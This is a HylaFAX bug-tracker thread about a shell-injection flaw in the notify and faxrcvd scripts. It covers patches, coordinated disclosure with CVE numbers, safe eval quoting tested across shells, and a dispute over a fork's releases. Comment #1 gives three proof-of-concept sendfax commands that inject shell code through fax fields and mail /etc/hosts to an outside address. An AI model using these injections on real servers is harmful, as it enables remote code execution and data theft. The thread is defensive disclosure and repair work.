| | **Bug#:** | [719](http://bugs.hylafax.org/show_bug.cgi?id=719) | | --- | --- | | **Product:** | bugzilla  Client Software  HylaFAX  HylaFAX Binary Packages  HylaFAX website |  | | **[Component](describecomponents.cgi?product=HylaFAX):** | documentation  fax protocol  faxaddmodem  faxadduser  faxcover  faxgetty  faxmail  faxq  faxrcvd  faxsend  faxstat  hfaxd  integration  internationalization  misc  modem/device support  notify  sendfax  sendpage  source-build  textfmt |  | | **[Status](page.cgi?id=fields.html#status):** | RESOLVED | | **[Resolution](page.cgi?id=fields.html#resolution):** | FIXED | | **[Assigned To](page.cgi?id=fields.html#assigned_to):** | Patrice Fournier <patrice.fournier@ifax.com> | | | **Hardware:** | All  DEC  HP  Macintosh  PC  SGI  Sun  Other |  | | --- | --- | --- | | **OS:** | All  MacOS X  Linux  BSDI  FreeBSD  NetBSD  OpenBSD  AIX  BeOS  HP-UX  IRIX  Neutrino  OpenVMS  OS/2  OSF/1  Solaris  SunOS  other |  | | **Version:** | 4.1.2  4.1.3  4.1.5  4.1.6  4.1.7  4.1.8  4.1.9  4.2.0  4.2.1  4.2.2  4.2.3  4.2.4  4.2.5  4.3.0  4.3.1  4.3.2  4.3.3  4.4.0  4.4.1  4.4.2  4.4.3  4.4.4  6.0.0  6.0.1  6.0.2  6.0.3  6.0.4  6.0.5  6.0.6  latest |  | | **[Priority](page.cgi?id=fields.html#priority):** | P1  P2  P3  P4  P5 |  | | **[Severity](page.cgi?id=fields.html#bug_severity):** | blocker  critical  major  normal  minor  trivial  enhancement |  | | | **Reporter:** | Darren Nickerson <darren@ifax.com> | | --- | --- | | **Add CC:** |  | | **CC:** | aidan@ifax.com eppesuig@debian.org faxguy@howardsilvan.com hylafax-devel@hylafax.org tim@multitalents.net   Remove selected CCs | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| | **URL:** |  | | | | | | --- | --- | --- | --- | --- | --- | | **Summary:** |  | | | | | | **[Keywords](describekeywords.cgi):**  | | | | | | | | |  | | | --- | --- | |

| Attachment | Type | Created | Size | Actions |
| --- | --- | --- | --- | --- |
| [notify vulnerability patch](attachment.cgi?id=978) | *patch* | 2005-12-19 21:14 | 1.99 KB | [Edit](attachment.cgi?id=978&action=edit) | [Diff](attachment.cgi?id=978&action=diff) |
| [faxrcvd vulnerability patch](attachment.cgi?id=979) | *patch* | 2005-12-19 21:16 | 831 bytes | [Edit](attachment.cgi?id=979&action=edit) | [Diff](attachment.cgi?id=979&action=diff) |
| [annoucement template](attachment.cgi?id=980) | text/plain | 2005-12-19 21:18 | 3.21 KB | [Edit](attachment.cgi?id=980&action=edit) |
| [moves the comments out of the awk p() function](attachment.cgi?id=983) | *patch* | 2006-01-06 20:34 | 1.71 KB | [Edit](attachment.cgi?id=983&action=edit) | [Diff](attachment.cgi?id=983&action=diff) |
| [faxrcvd - let the shell sanitize it](attachment.cgi?id=984) | *patch* | 2006-01-07 14:14 | 705 bytes | [Edit](attachment.cgi?id=984&action=edit) | [Diff](attachment.cgi?id=984&action=diff) |
| [test.sh](attachment.cgi?id=985) | text/plain | 2006-01-09 10:43 | 829 bytes | [Edit](attachment.cgi?id=985&action=edit) |
| [Result of running test.sh under the 'script' command](attachment.cgi?id=986) | text/plain | 2006-01-09 11:23 | 1.56 KB | [Edit](attachment.cgi?id=986&action=edit) |
| [Create a New Attachment](attachment.cgi?bugid=719&action=enter) (proposed patch, testcase, etc.) | | | | [View All](attachment.cgi?bugid=719&action=viewall) |

| Bug 719 depends on: |  |  | [Show dependency tree](showdependencytree.cgi?id=719)  [Show dependency graph](showdependencygraph.cgi?id=719) |
| --- | --- | --- | --- |
| Bug 719 blocks: |  |  |

| [Votes](page.cgi?id=voting.html): | 0    [Show votes for this bug](votes.cgi?action=show_bug&bug_id=719)    [Vote for this bug](votes.cgi?action=show_user&bug_id=719#vote_719) |
| --- | --- |

**Additional Comments:**

Add to CC list

Leave as **RESOLVED FIXED**

Reopen bug

Mark bug as **VERIFIED**

Mark bug as **CLOSED**

**[View Bug Activity](show_activity.cgi?id=719)
  |
[Format For Printing](show_bug.cgi?format=multiple&id=719)
  |
[Clone This Bug](enter_bug.cgi?cloned_bug_id=719)**

---

| **[Description](show_bug.cgi?id=719#c0):** | **Opened:** 2005-12-19 10:43 |
| --- | --- |

```

```

------- *Comment
[#1](show_bug.cgi?id=719#c1) From
Patrice Fournier
2005-12-19 21:12*

-------
```
Try one of (Make sure you replace the phone number to something else if your
server does not automatically reject 411 as mine does... ):

sendfax -d "411;number=\`cat /etc/hosts\`" /etc/hosts

sendfax -f "\`cat /etc/hosts|mail -s hosts pfournier@ifax.com\`
<pfournier@ifax.com>" -d 411 /etc/hosts

sendfax -d "@411\";cat /etc/hosts|mail -s hosts pfournier@ifax.com;" /etc/hosts

For the first example, you need to make sure you are going to be notified and
look at the notification message...

It's possible to run anything as the user the notify script run as (usually
uucp) for someone who can send a job to the server...

As this apply to the new notify shell script, this is a 4.2.x only bug...

faxrcvd may be similarily affected if someone could pass some similar bogus
stuff to the CallID variables... To be vulnerable, a machine would need to
accepts incoming faxes and use some form of CallID that can be manipulated by
the sending user... This is a 4.2.3 only bug as CallID was not implemented (in
the current form) before that.

```

------- *Comment
[#2](show_bug.cgi?id=719#c2) From
Patrice Fournier
2005-12-19 21:14*

-------
```
[Created an attachment (id=978)](attachment.cgi?id=978&action=view "notify vulnerability patch") [[edit]](attachment.cgi?id=978&action=edit "notify vulnerability patch")
notify vulnerability patch

This patch fixes the vulnerability by using single quotes for eval parameters
and escaping such quotes in the content. New lines (for status) will be
correctly processed. All the examples provided and a couple of others I had
have been tested and were treated as normal text.

status has been reworked to remove now unneeded escaping/removal of * and
backticks and to simplify the logic.
```

------- *Comment
[#3](show_bug.cgi?id=719#c3) From
Patrice Fournier
2005-12-19 21:16*

-------
```
[Created an attachment (id=979)](attachment.cgi?id=979&action=view "faxrcvd vulnerability patch") [[edit]](attachment.cgi?id=979&action=edit "faxrcvd vulnerability patch")
faxrcvd vulnerability patch

This patch fixes the CallID vulnerability in faxrcvd.
```

------- *Comment
[#4](show_bug.cgi?id=719#c4) From
Patrice Fournier
2005-12-19 21:18*

-------
```
[Created an attachment (id=980)](attachment.cgi?id=980&action=view "annoucement template") [[edit]](attachment.cgi?id=980&action=edit "annoucement template")
annoucement template

This is an announcement template. It includes the login vulnerability when PAM
is not enabled fixed in [bug 682](show_bug.cgi?id=682 "RESOLVED FIXED - hfaxd PAM support doesn't work for non-passworded authentication").

Some dates and CVE numbers are to be replaced.
```

------- *Comment
[#5](show_bug.cgi?id=719#c5) From
Aidan Van Dyk
2005-12-21 10:39*

-------
```
What about a proposed release date for this?

I'm proposing Jan 4, 2006.  I'ld hate to do it between the christmas and new
years holidays...

I'ld like to notify vendor-sec today, so comments or other proposals much
appreciated!
```

------- *Comment
[#6](show_bug.cgi?id=719#c6) From
Aidan Van Dyk
2005-12-21 10:44*

-------
```
I'm adding Giuseppe Sacco <eppesuig@debian.org>, the debian maintainer to this
bug so he is in the loop as well.
```

------- *Comment
[#7](show_bug.cgi?id=719#c7) From
Lee Howard
2005-12-21 13:55*

-------
```
There are two (or three, depending on how you see it) different vulnerabilities
mentioned in the vuln announcement.

The one this bug report is about is with regards to authenticated users
"injecting" mischevious code... which amounts to a local code execution
vulnerability and perhaps a priviledge escalation vulnerability (if getting
uucp/fax priveledges means something on the system).  This isn't good, but it's
limited to "authenticated" users.

The other bug, the one that lets anyone and his pet dog authenticate with any
password escalates the critical nature of the bug reported here.  With that bug
alone the mal-intentioned person could "merely" send faxes and look in on the
queues and such ... an information disclosure vulnerability and an
unauthenticated usage vulnerability.

BUT, with the two bugs together we run into a situation where anyone with
network connectivity to the system, perhaps only even via e-mail, can now run
any code on the system with the priveledges of the fax services.

Now, many systems will be built with PAM support, so that's a mitigating
circumstance.  Some systems will have compilers that don't let functions return
true unless instructed to do so.  But it's not a good scenario for the others.

The other bug is already public information.  Suggesting in any way to users
that are vulnerable to the bug of public knowledge that it is acceptable for
them to wait around until January 6 to upgrade is not sound advice.  I belive
that the advice needs to be, "You should either update to the beta or firewall
your HylaFAX services... and then plan on updating again on January 6."

There are going to be plenty of people that will be confused by that approach,
so it needs to be said that we're doing it this way to coordinate a security
update with the various distributions of HylaFAX.  I think that the ideal way to
avoid these kinds of discussions is to avoid making public statements of any
kind about known vulnerabilities until the fix is available.  It's like having a
doctor tell you that you have a disease but that he won't tell you what it is or
how to care for yourself until his insurance policy kicks in.

As long as the vulnerability discussed on this bug isn't likely to be discovered
elsewhere before January 6 then I think it's probably a good idea to wait on
publishing this information (or even the nature of the vulnerability) until
then.  But I would have preferred to have seen no public comments about this
vulnerability until such a time as the fix was available, and I would have
preferred seeing a public recommendation to update to the "beta" or firewall
before that release.
```

------- *Comment
[#8](show_bug.cgi?id=719#c8) From
Aidan Van Dyk
2005-12-21 14:18*

-------
```
> The other bug, the one that lets anyone and his pet dog authenticate with any
> password escalates the critical nature of the bug reported here.  With that bug
> alone the mal-intentioned person could "merely" send faxes and look in on the
> queues and such ... an information disclosure vulnerability and an
> unauthenticated usage vulnerability.

Right.  It is restricted in that it has to be a valid user, so user@host
entries in hosts.hfaxd mitigate this affect.  So abuses have to know
a valid username (many probably may have that as .*), and from a
valid host.  And the fact that most people won't have disabled PAM
support (and those that have compiled from source could easily apply the
1-line patch and re-compile).

> BUT, with the two bugs together we run into a situation where anyone with
> network connectivity to the system, perhaps only even via e-mail, can now run
> any code on the system with the priveledges of the fax services.

Almost - Anyone with a valid (possibly guessed/proped) user@host can,
with no password, run code on the system (to the point of uploading a
"document" and running it also).

But this bug is independant of the PAM one and still gives anybody who
can "email faxes" via gateways this ability.  TPC anyone?

> Now, many systems will be built with PAM support, so that's a mitigating
> circumstance.  Some systems will have compilers that don't let functions return
> true unless instructed to do so.  But it's not a good scenario for the others.
>
> The other bug is already public information.  Suggesting in any way to users
> that are vulnerable to the bug of public knowledge that it is acceptable for
> them to wait around until January 6 to upgrade is not sound advice.  I belive
> that the advice needs to be, "You should either update to the beta or firewall
> your HylaFAX services... and then plan on updating again on January 6."

Or, if you have PAM, enable it.  It won't give out any extra
information.  Setting up host auth in hosts.hfaxd will block "random"
other people from directly accessing things.  And of course, firewalling
your HylaFAX service is *always* a good idea.

We should propbaly point to the patch that fixes that particur bug that
is already in CVS.  It's a one line fix that anybody can easily and
safely apply if they've rolled their own.

And, of course, the beta *is* what we are hoping will be released soon
(minus the new vulnerability), so we can encourage people upgrade with
care. Again, stressing that it only affects systems where pam was
disabled (that means explicitly disabled, or has no PAM).

```

------- *Comment
[#9](show_bug.cgi?id=719#c9) From
Aidan Van Dyk
2005-12-21 14:26*

-------
```
Jan 4 OK?

```

------- *Comment
[#10](show_bug.cgi?id=719#c10) From
Aidan Van Dyk
2005-12-23 12:33*

-------
```
Martin Schulze <joey@infodrom.org> from debian has helped us obtain CVE numbers
from MITRE:

For hfaxd vulnerabilty:
  CVE-2005-3538

For scripting vulnerabilty:
  CVE-2005-3539
```

------- *Comment
[#11](show_bug.cgi?id=719#c11) From
Lee Howard
2005-12-27 21:58*

-------
```
I'm working on some multi-lingual translation work of notify, faxrcvd, and
pollrcvd e-mails (called "dictionary").  It appears that it's going to need to
use eval, and thus there are going to be many instances where eval is used with
possible user data involved.

We're potentially talking about a lot of instances here.

Is this sanitization something that is going to need to be done on a
per-instance-of-eval basis or is there some broader kind of approach that we can
take?

For example, in that same dictionary work I'm also beginning the
bin/common-functions script.  Maybe there we could have our own eval-wrapper
that would sanitize everything before passing it to eval.
```

------- *Comment
[#12](show_bug.cgi?id=719#c12) From
Aidan Van Dyk
2005-12-28 11:17*

-------
```
> I'm working on some multi-lingual translation work of notify, faxrcvd, and
> pollrcvd e-mails (called "dictionary").  It appears that it's going to need to
> use eval, and thus there are going to be many instances where eval is used with
> possible user data involved.

So, we'll have to do this carefully.  Alternatively, we could use some
alternative methods (like printf?) instead of evaling strings all the
time.

i.e.
	NEWSTRING=`eval $OLDSTRING1$USERINPUT$OLDSTRING2`
could become
	NEWSTRING=`printf "$OLDSTRING1%s$OLDSTRING2" "$USERINPUT"`
which is safe.  In this case, $USERINPUT is a single argument, and has
no chance for expansion/evaluation by the shell.

> We're potentially talking about a lot of instances here.

Yup.

> Is this sanitization something that is going to need to be done on a
> per-instance-of-eval basis or is there some broader kind of approach that we can
> take?

Well, the problem of this sanitation is that it has to be
"case-by-case", because each case is unique.  Of course, there can be
common cases, like in the sed parsing of the qfile, we didn't do it for
every item, but only once for the function that generates the shell to
be eval'ed.

> For example, in that same dictionary work I'm also beginning the
> bin/common-functions script.  Maybe there we could have our own eval-wrapper
> that would sanitize everything before passing it to eval.

I don't think you could do that, without knowing what the wanted string
was in each case.  There could very well be "common" uses of eval which
could/should be pulled into common functions.  a common functions
collection (I would put in etc, like setup.cache, setup.modem, not bin)
is something that I think is overdue.  It would reduce a lot of
duplicated code, and would hopefully be a central place to worry
seriously about eval-style security concerns.

```

------- *Comment
[#13](show_bug.cgi?id=719#c13) From
Darren Nickerson
2006-01-04 11:03*

-------
```
Opening bug to public in coordination with release of 4.2.4, and resolving it
since changes have been committed to CVS.
```

------- *Comment
[#14](show_bug.cgi?id=719#c14) From
Lee Howard
2006-01-06 19:16*

-------
```
With the changes I'm getting this from notify now:

+ parseQfile
bin/notify: command substitution: line 5: syntax error near unexpected token `)'
bin/notify: command substitution: line 5: `        # strings (quoted with (')).
Single-quotes can't even be escaped'
+ eval

Also note that JPR is having problems with the faxrcvd change with his SCO box:

<http://article.gmane.org/gmane.comp.telephony.fax.hylafax.user/16312>
```

------- *Comment
[#15](show_bug.cgi?id=719#c15) From
Giuseppe Sacco
2006-01-06 19:52*

-------
```
A user reported the same problem using gawk. Please see
<http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=346254>
```

------- *Comment
[#16](show_bug.cgi?id=719#c16) From
Lee Howard
2006-01-06 20:34*

-------
```
[Created an attachment (id=983)](attachment.cgi?id=983&action=view "moves the comments out of the awk p() function") [[edit]](attachment.cgi?id=983&action=edit "moves the comments out of the awk p() function")
moves the comments out of the awk p() function

Yes, moving the comments out of the awk seems to resolve matters.  Attaching a
patch.
```

------- *Comment
[#17](show_bug.cgi?id=719#c17) From
Giuseppe Sacco
2006-01-07 05:47*

-------
```
Are you going to create a new release, like 4.2.4.1, with the corrected patch?

```

------- *Comment
[#18](show_bug.cgi?id=719#c18) From
Darren Nickerson
2006-01-07 07:49*

-------
```
This will probably trigger a 4.2.5 release cycle, yes. I suspect we'll be able
to get something out quickly which is 4.2.4 + patch. You should see movement in
this direction on monday - the patch's original author still hasn't had a chance
to weigh in on the problem/patch.
```

------- *Comment
[#19](show_bug.cgi?id=719#c19) From
Lee Howard
2006-01-07 14:14*

-------
```
[Created an attachment (id=984)](attachment.cgi?id=984&action=view "faxrcvd - let the shell sanitize it") [[edit]](attachment.cgi?id=984&action=edit "faxrcvd - let the shell sanitize it")
faxrcvd - let the shell sanitize it

I've released 4.2.4.2 that includes the modification to notify.  Among other
things, it also includes this change in faxrcvd (patch attached), changing the
line from:

 eval "CALLID$COUNT='`echo $1 | $SED -e "s/'/'\\\\\''/g"`'"

to:

 CALLID='$1'
 eval "CALLID$COUNT=\"$CALLID\""

Which seems to follow the the safe eval approach that was discussed yesterday
on devel.  I assume that 1) this approach is not exploitable, and 2) it will
resolve the issue that JPR reported on his SCO box.

<http://hylafax.sourceforge.net/news/4.2.4.2.php>
```

------- *Comment
[#20](show_bug.cgi?id=719#c20) From
Darren Nickerson
2006-01-07 14:34*

-------
```
Lee,

Your release announcements do not belong is this forum. To the degree that you
wish to collaborate and make decisions by concensus, you are very welcome here.
On sourceforge, you can unilaterally make decisions about what is good and what
is right, and cut releases as often as you like (even if you continue to name
them in a way that makes them difficult to distinguish from our releases). But
please don't add to the confusion by announcing those releases here. Sourceforge
releases have no formal standing in this forum and a patch is all that people
require to evaluate proposed fixes and decide a way forward for the next
hylafax.org release.

Some people don't work on HylaFAX on the weekends, so in this case the
concensus-based development process may seem frustratingly slow. But there are
people we have not yet heard from including the original author of the patch,
and we will not release without concensus.

-Darren

```

------- *Comment
[#21](show_bug.cgi?id=719#c21) From
Lee Howard
2006-01-07 16:48*

-------
```
Darren, I was merely replying to Giuseppe's post, which appeared directed to
me,
as it referred to 4.2.4.1.

The work being done on Sourceforge *is* collaborative.  When this "new
community
site" thread had worked it's way to the end on -users the "consensus" was to:

  1) differentiate web sites
  2) do not use the phrase "The HylaFAX Development Team"
  3) make it clear what the difference was between the sites
  4) use one set of mailing lists
  5) use one bug tracker

I think that those results were a positive way to approach a collaborative
fork.

You've now scowled once at a -user discussion of features on sourceforge (#4),
and now you've taken issue with #5... and honestly, I don't understand what the
point of that is... to frustrate the collaboration?

In any case, this is not the place for this discussion.  I'll not continue it
here further.  My previous comments were merely in response to Giuseppe's
question.  If you continue to insist that all hylafax.sf.net activity should be
removed from hylafax.org, then I can make that happen; however, I do not
believe
that it would be in the best interests of the community in general... but
that's
your call.

```

------- *Comment
[#22](show_bug.cgi?id=719#c22) From
Darren Nickerson
2006-01-08 12:02*

-------
```
Lee Howard wrote:

> Darren, I was merely replying to Giuseppe's post, which appeared directed to
> me, as it referred to 4.2.4.1.

I interpreted Guiseppe's question to refer to the HylaFAX we are working on here
at HylaFAX.org, especially since he asked if we were going to release a 4.2.4.1
(or something) point release, ... something you'd already announced days earlier
and of which I am sure he was aware.

This very clearly illustrates the problem with your 'release' naming scheme, and
I renew my initial objection to it. If you're serious about not wanting to
confuse people, please name your 'subreleases' something like hylafax-4.2.4lh3.
That would make it clear that it's an official 4.2.4 base distribution, with rev
level three of Lee Howard goodies. Please consider this seriously, ... it seems
like a harmless change for you to make and yet will make a world of difference
in helping people understand the difference between your work and ours.

> The work being done on Sourceforge *is* collaborative.  When this "new
> community site" thread had worked it's way to the end on -users the
> "consensus" was to:

I don't agree that any concensus was reached. Your position changed often and I
could not keep track. Your last grandiose announcement seemed to be a call for
all developers to move to Sourceforge, and as such was ignored. I like most
aspects of your new website - thanks for taking down the hylafax.org site you
deplicated. That doesn't mean any great concensus was reached though.

> I think that those results were a positive way to approach a collaborative
> fork.

So now this is a collaborative fork? I'll look that up ... I'm not sure exactly
what that means. I like the first word of that - collaborative. I (and I'm sure
everyone else) welcomes your collaboration here. I'll focus on that.

If you want to participate here, and announce work on our mailing lists and
collect feedback from the people who subscribe here, please make sure that work
is in the hylafax.org bugzilla so that other members of this community can
participate in the collaborative process. It doesn't have to be in CVS, or even
being considered for CVS yet, but it should definitely appear in bugzilla
(internationalization being one notable example).

-d
```

------- *Comment
[#23](show_bug.cgi?id=719#c23) From
Patrice Fournier
2006-01-08 20:01*

-------
```
> [...] change in faxrcvd (patch attached), changing the
> line from:
>
> eval "CALLID$COUNT='`echo $1 | $SED -e "s/'/'\\\\\''/g"`'"
>
> to:
>
>  CALLID='$1'
>  eval "CALLID$COUNT=\"$CALLID\""
>
> Which seems to follow the the safe eval approach that was discussed yesterday
> on devel.  I assume that 1) this approach is not exploitable, and 2) it will
> resolve the issue that JPR reported on his SCO box.

After thinking of the discussion we had on -devel, I also later realized we
could simplify the faxrcvd script and remove a call to sed. We don't need to go
through the CALLID variable though, only need to make sure $1 is not expanded
before calling eval:
 eval "CALLID$COUNT=\"\$1\""

And the comment can then be simplified to:
# We quote the $ of $1 to make sure the $1 variable is not expanded before
# eval is called so that it's content can't be used against us.

As for the notify patch, yes, the single quotes inside the comments will cause
problems. The original patch I wrote didn't have single-quotes in the comments
and when I reworded them, it seems my tests didn't pick up the new version so
where still working as expected. Sorry about that. The two possibilities are to
either remove the single quotes from the comments or to move the comments out of
the awk script (which is enclosed in single-quotes, thus causing this problem).
As this is right at the start of the awk script and the comments explanations
are important, I think the best solution is to move them outside the awk script
and not change them.
```

------- *Comment
[#24](show_bug.cgi?id=719#c24) From
Darren Nickerson
2006-01-09 09:43*

-------
```
Expanding bug report to include -devel prior to finalizing fixes.

```

------- *Comment
[#25](show_bug.cgi?id=719#c25) From
Aidan Van Dyk
2006-01-09 10:43*

-------
```
[Created an attachment (id=985)](attachment.cgi?id=985&action=view "test.sh") [[edit]](attachment.cgi?id=985&action=edit "test.sh")
test.sh

This is a simple test to see what various things do on various shells.	Running
it should give an idea of what works on your shell.  It would be very
informative to get the results from Jean-Pierre Radley on SCO.

The reason the original eval "...='...|sed -e "s/'.../g"' doesn't work is
simply that the hard the sed expression is being pulled out of the sub-shell
differently on different shells.  But on top of that, the "right" sed
expression is different for solaris sed and GNU sed too.

The "worst" shell I have access to is /bin/sh on Solaris 8.

But it appears that the simplest way to handle it is (tested on /bin/sh with
solaris 8, solaris 9, and redhat/debian bash):

   eval CALLID$COUNT='$1'
or
   eval CALLID$COUNT="\$1"
which is equivlilant to:
   eval "CALLID$COUNT=\$1"

To get the sed version to work, we need the same sed expression to work on all
sed (solaris sed needs a different expression from gnu sed), as well as getting
the expansion correct from the subshell.

I vote for
    eval CALLID$COUNT='$1'
as long as it works everywhere...  We need test results on the various shells

Looks simplest, and removes the extra varible assignment from Lee's that some
user is going to try and use ($CALLID instead of $CALLID[0-9])
```

------- *Comment
[#26](show_bug.cgi?id=719#c26) From
Jean-Pierre Radley
2006-01-09 11:23*

-------
```
[Created an attachment (id=986)](attachment.cgi?id=986&action=view "Result of running test.sh under the 'script' command") [[edit]](attachment.cgi?id=986&action=edit "Result of running test.sh under the 'script' command")
Result of running test.sh under the 'script' command

I typed 'script', then ran test.sh; I've left the CarriageReturns in the
captured 'typescript.
This run of test.sh was done on SCO OpenServer 6.0.0, whose man page for 'sh'
asserts:

 sh is conformant with:

   ISO/IEC DIS 9945 - 2:1992, Information technology - Portable
   Operating System Interface (POSIX) - Part 2: Shell and Utilities
   (IEEE Std 1003.2 - 1992);
   AT&T SVID Issue 2;
   X/Open CAE Specification, Commands and Utilities, Issue 4, 1992.

```

------- *Comment
[#27](show_bug.cgi?id=719#c27) From
Aidan Van Dyk
2006-01-09 11:27*

-------
```
Note: a word of warning I didn't think of - do *NOT* blindly run this test.sh
on
a server without shadow passwords, are at least sanitize the output.  If you
have an encrypted password in /etc/passwd, the first line *will* be displayed..
 I probably should have picked a safer file (like group of something)! Sorry!

```

------- *Comment
[#28](show_bug.cgi?id=719#c28) From
Aidan Van Dyk
2006-01-09 11:37*

-------
```
Jean-Piere,

It's really hard to read the script output.

From the looks of the set -x logging during the evals, method a and b both
worked for TEST1 and TEST2 (as expected) and method c & d both fail.

But I don't see any "results" being printed...

Can you remove the "set -" line and see if it prints results?  I thin the
results should just confirm what we are thinking, but just to be sure...
```

------- *Comment
[#29](show_bug.cgi?id=719#c29) From
Aidan Van Dyk
2006-01-09 12:12*

-------
```
I committed Lee's notify part - moving the comments out of the awk script.

Any concensus on the prefered eval method for faxrcvd?

  eval "CALLID$COUNT=\$1"
or
  eval CALLID$COUNT='$1'

```

------- *Comment
[#30](show_bug.cgi?id=719#c30) From
Aidan Van Dyk
2006-01-09 14:13*

-------
```
===== util/faxrcvd.sh.in 1.26 vs edited =====
--- 1.26/util/faxrcvd.sh.in     2006-01-04 10:33:35 -05:00
+++ edited/util/faxrcvd.sh.in   2006-01-09 14:11:58 -05:00
@@ -103,12 +103,9 @@ COMMID="$1"; shift;
 MSG="$1"; shift;
 COUNT=1
 while [ $# -ge 1 ]; do
-    # In shell scripts, there are no special characters in hard-quoted
-    # strings (quoted with (')). Single-quotes can't even be escaped
-    # inside such strings and must be put outside of them. We thus replace
-    # (') with ('\'') which terminates the current string, adds a single
-    # quote and starts a new string.
-    eval "CALLID$COUNT='`echo $1 | $SED -e "s/'/'\\\\\''/g"`'"
+    # The eval has $1 set yet, and this forces a variable-to-variable
+    # assignment, allowing us to not need to do escaping
+    eval CALLID$COUNT='$1'
     shift
     COUNT=`expr $COUNT + 1`
 done

```

------- *Comment
[#31](show_bug.cgi?id=719#c31) From
Patrice Fournier
2006-01-20 12:06*

-------
```
The last fix was also commited to CVS on January 9 2006.

```

---

*First*
*Last*
*Prev*
*Next*

*No search results available*
     [Search page](query.cgi)
     [Enter new bug](enter_bug.cgi)


